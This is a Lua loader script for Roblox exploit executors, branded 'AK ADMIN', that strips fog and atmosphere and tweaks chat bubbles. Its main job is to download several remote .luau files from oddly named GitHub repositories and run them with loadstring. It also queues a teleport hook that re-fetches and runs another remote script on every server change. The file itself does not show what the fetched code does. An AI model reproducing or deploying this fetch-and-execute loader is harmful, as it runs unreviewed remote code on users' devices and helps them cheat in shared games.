-- Global variable to prevent multiple instances with enhanced check
if _G.AKAdminLoaded then
    local success, _ = pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "AK ADMIN",
            Text = "Script is already running!",
            Duration = 5
        })
    end)
    if not success then
        warn("Failed to show notification, but script is already running")
    end
    return
end

-- Initialize global state
local errors = {}
local services = {
    Players = game:GetService("Players"),
    Lighting = game:GetService("Lighting"),
    StarterGui = game:GetService("StarterGui"),
    CoreGui = game:GetService("CoreGui"),
    ScriptContext = game:GetService("ScriptContext")
}

-- Robust service getter
local function getService(serviceName)
    local service = services[serviceName]
    if not service then
        local success, result = pcall(game.GetService, game, serviceName)
        if success then
            services[serviceName] = result
            return result
        end
        warn(string.format("Failed to get service %s: %s", serviceName, tostring(result)))
        return nil
    end
    return service
end

-- Enhanced player module loading
local function getPlayerModule()
    local player = services.Players.LocalPlayer
    if not player then
        for i = 1, 10 do
            player = services.Players.LocalPlayer
            if player then break end
            task.wait(1)
        end
        if not player then
            warn("LocalPlayer not found after 10 seconds")
            return nil
        end
    end
    
    local PlayerScripts = player:WaitForChild("PlayerScripts", 15)
    if not PlayerScripts then
        warn("PlayerScripts not found after 15 seconds")
        return nil
    end
    
    local PlayerModule = PlayerScripts:WaitForChild("PlayerModule", 15)
    if not PlayerModule then
        warn("PlayerModule not found after 15 seconds")
        return nil
    end
    
    return PlayerModule
end

-- Enhanced atmosphere and fog handling
local function RemoveAtmosphereAndSetFog()
    local success, error = pcall(function()
        local Lighting = getService("Lighting")
        if not Lighting then return end
        
        -- Safely set fog
        pcall(function() Lighting.FogEnd = 100000 end)
        
        -- Safely remove atmosphere
        for _, v in ipairs(Lighting:GetDescendants()) do
            if v:IsA("Atmosphere") then
                pcall(function() v:Destroy() end)
            end
        end
    end)
    if not success then
        warn("Failed to modify atmosphere:", error)
        table.insert(errors, {
            type = "atmosphere",
            error = error,
            time = os.time(),
            stack = debug.traceback()
        })
    end
end

-- Enhanced HTTP request handling
local function safeHttpGet(url)
    if not url or type(url) ~= "string" then
        warn("Invalid URL provided to safeHttpGet")
        return nil
    end

    local tries = 0
    local maxTries = 3
    
    while tries < maxTries do
        local success, result = pcall(function()
            return game:HttpGet(url)
        end)
        
        if success and result then
            return result
        end
        
        tries = tries + 1
        warn(string.format("Attempt %d/%d failed to fetch URL: %s Error: %s", 
            tries, maxTries, url, tostring(result)))
        
        if tries < maxTries then
            task.wait(1) -- Wait before retry
        end
    end
    
    table.insert(errors, {
        type = "HttpGet",
        url = url,
        error = "Failed after " .. maxTries .. " attempts",
        time = os.time(),
        stack = debug.traceback()
    })
    return nil
end

-- Enhanced string loading
local function safeLoadString(source, url)
    if not source then
        warn("No source provided to safeLoadString")
        return
    end

    local success, func = pcall(loadstring, source)
    if not success then
        warn("Failed to load string from: " .. tostring(url))
        table.insert(errors, {
            type = "loadstring-load",
            url = url,
            error = tostring(func),
            time = os.time(),
            stack = debug.traceback()
        })
        return
    end

    local execSuccess, execError = pcall(func)
    if not execSuccess then
        warn("Failed to execute string from: " .. tostring(url))
        table.insert(errors, {
            type = "loadstring-execution",
            url = url,
            error = tostring(execError),
            time = os.time(),
            stack = debug.traceback()
        })
    end
end

-- Enhanced queue teleport
local function setupQueueTeleport()
    local queueteleport = (syn and syn.queue_on_teleport) or 
                         queue_on_teleport or 
                         (fluxus and fluxus.queue_on_teleport)
    
    if queueteleport then
        local success, error = pcall(function()
            local teleportScript = [[
                task.spawn(function()
                    local success, source = pcall(function()
                        return game:HttpGet('https://raw.githubusercontent.com/LOLkeeptrying/AKADMIN/refs/heads/main/Congratslol')
                    end)
                    if success and source then
                        loadstring(source)()
                    end
                end)
            ]]
            queueteleport(teleportScript)
        end)
        
        if not success then
            warn("Failed to queue teleport script:", error)
            table.insert(errors, {
                type = "queue-teleport",
                error = error,
                time = os.time(),
                stack = debug.traceback()
            })
        end
    end
end

-- Enhanced bubble chat adjustment
local function AdjustBubbleChat()
    local success, error = pcall(function()
        local player = services.Players.LocalPlayer
        if not player then return end
        
        local CoreGui = getService("CoreGui")
        if not CoreGui then return end
        
        local chatBubble = CoreGui:FindFirstChild("ExperienceChat")
        if not chatBubble then return end
        
        local bubbleChat = chatBubble:FindFirstChild("bubbleChat")
        if not bubbleChat then return end
        
        local playerBubble = bubbleChat:FindFirstChild("BubbleChat_" .. player.UserId)
        if playerBubble then
            playerBubble.StudsOffset = Vector3.new(0, 1, 0)
        end
    end)
    
    if not success then
        warn("Failed to adjust bubble chat:", error)
        table.insert(errors, {
            type = "bubble-chat",
            error = error,
            time = os.time(),
            stack = debug.traceback()
        })
    end
end

-- Enhanced executor compatibility
local function initializeExecutorCompat()
    local function warnUnsupported(feature)
        return function()
            warn(feature .. " is not supported on this executor")
        end
    end

    _G.setclipboard = setclipboard or toclipboard or set_clipboard or warnUnsupported("Clipboard")
    _G.writefile = writefile or warnUnsupported("Write file")
    _G.readfile = readfile or warnUnsupported("Read file")
end

-- Enhanced initialization
local function Initialize()
    -- Ensure we're not already loaded
    if _G.AKAdminLoaded then return end
    _G.AKAdminLoaded = true
    
    -- Set up enhanced error handling
    services.ScriptContext.Error:Connect(function(message, trace)
        table.insert(errors, {
            type = "global-error",
            message = message,
            trace = trace,
            time = os.time(),
            stack = debug.traceback()
        })
    end)

    -- Wait for game load with timeout
    if not game:IsLoaded() then
        local loaded = false
        local connection
        connection = game.Loaded:Connect(function()
            loaded = true
            if connection then connection:Disconnect() end
        end)
        
        local timeout = task.delay(30, function()
            if not loaded then
                warn("Game failed to load after 30 seconds")
                if connection then connection:Disconnect() end
            end
        end)
    end

    -- Initialize components with proper sequencing
    local success = pcall(function()
        local PlayerModule = getPlayerModule()
        if not PlayerModule then
            warn("PlayerModule not loaded - some features may be limited")
        end
        
        RemoveAtmosphereAndSetFog()
        setupQueueTeleport()
        initializeExecutorCompat()
        
        -- Load additional scripts with retry mechanism
        local scripts = {
            "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/loadplayertagss.luau",
            "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/loadownercmdss.luau",
            "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/betterchatdtcsyss.luau",
            "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/akactivee.luau"
        }
        
        for _, url in ipairs(scripts) do
            local content = safeHttpGet(url)
            if content then
                safeLoadString(content, url)
            end
        end
        
        -- Start bubble chat adjustment with error recovery
        task.spawn(function()
            while task.wait(1) do
                pcall(AdjustBubbleChat)
            end
        end)
    end)

    if success then
        print("AK ADMIN loaded successfully!")
    else
        warn("AK ADMIN encountered errors during initialization")
    end
end

-- Start the script with comprehensive error handling
pcall(Initialize)
